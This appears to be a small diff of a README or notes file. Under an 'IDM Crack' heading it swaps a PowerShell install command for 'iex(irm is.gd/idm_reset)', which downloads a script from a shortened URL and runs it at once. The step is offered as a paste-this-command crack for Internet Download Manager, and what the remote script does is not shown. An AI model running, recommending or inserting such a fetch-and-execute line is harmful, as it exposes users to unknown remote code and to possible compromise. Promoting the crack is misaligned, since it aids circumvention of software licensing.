@@ -272,7 +272,7 @@ git push origin main  # or your current branch
 ## IDM 
   - **IDM Crack**
   ```sh
-  winget install --id Microsoft.Powershell
+  iex(irm is.gd/idm_reset)
   ```
 
 <br><br><br><br>
